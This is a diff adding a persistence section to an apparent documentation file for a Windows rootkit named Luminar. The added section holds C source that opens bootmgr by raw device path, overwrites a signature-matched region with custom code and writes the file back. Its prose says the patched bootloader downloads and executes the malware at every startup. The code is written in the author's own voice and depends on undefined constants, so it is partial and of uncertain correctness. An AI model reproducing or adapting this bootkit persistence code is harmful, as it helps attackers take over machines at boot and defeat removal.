@@ -242,3 +242,62 @@ NTSTATUS HookedNtQueryDirectoryFile(
 ## Persistence
 
 To ensure its persistence, Luminar modifies the Windows bootloader to guarantee its loading at each system startup.
+
+### Bootloader Modification
+
+```c
+BOOL ModifyWindowsBootloader()
+{
+    // Open the bootloader
+    HANDLE hBootmgr = CreateFile(
+        L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolume1\\bootmgr",
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL);
+    
+    if (hBootmgr == INVALID_HANDLE_VALUE)
+        return FALSE;
+    
+    // Read the bootloader
+    DWORD dwSize = GetFileSize(hBootmgr, NULL);
+    PBYTE pBuffer = (PBYTE)malloc(dwSize);
+    
+    if (!ReadFile(hBootmgr, pBuffer, dwSize, &dwSize, NULL))
+    {
+        CloseHandle(hBootmgr);
+        free(pBuffer);
+        return FALSE;
+    }
+    
+    // Modify the bootloader to include our download code
+    BOOL bModified = FALSE;
+    for (DWORD i = 0; i < dwSize - SIGNATURE_SIZE; i++)
+    {
+        if (MemCompare(&pBuffer[i], BOOTMGR_SIGNATURE, SIGNATURE_SIZE))
+        {
+            // Replace with our custom code
+            memcpy(&pBuffer[i], CUSTOM_BOOTLOADER_CODE, CUSTOM_BOOTLOADER_SIZE);
+            bModified = TRUE;
+            break;
+        }
+    }
+    
+    // Write the modified bootloader
+    if (bModified)
+    {
+        SetFilePointer(hBootmgr, 0, NULL, FILE_BEGIN);
+        WriteFile(hBootmgr, pBuffer, dwSize, &dwSize, NULL);
+    }
+    
+    // Cleanup
+    CloseHandle(hBootmgr);
+    free(pBuffer);
+    
+    return bModified;
+}
+```
+
+The modified bootloader contains code that automatically downloads and executes the Luminar executable during system startup, thus ensuring its persistence even if the original file is deleted.
